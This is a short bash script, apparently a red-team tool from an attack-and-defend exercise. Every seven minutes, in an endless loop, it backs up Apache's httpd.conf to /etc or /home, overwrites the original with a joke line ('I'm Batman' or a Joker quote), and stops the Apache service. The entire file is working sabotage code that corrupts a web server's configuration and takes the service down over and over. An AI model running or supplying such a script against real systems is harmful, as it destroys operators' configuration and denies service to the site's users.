#!/bin/bash

# Loop forever
while true
do
 #Sleep for 7 minutes, enough time for the blue team to figure out that the service is down and try to fix it. Then repeat.
 sleep 420

 #Generate random number, check if the number is even or odd
 if [ $(( $RANDOM % 2)) -eq 0 ]
 then
 #Copy config file to other location, then overwrite original
   cp '/etc/httpd/conf/httpd.conf' '/etc/mm.conf'
   echo "I'm Batman" > '/etc/httpd/conf/httpd.conf'
 else
 #Copy config file to other location, then overwrite original
   cp '/etc/httpd/conf/httpd.conf' '/home/mm.conf'
   echo "You ever dance with the devil in the pale mooon light?" > '/etc/httpd/conf/httpd.conf'
 fi
 
 #Stop apache service
 sudo service apache2 stop
done
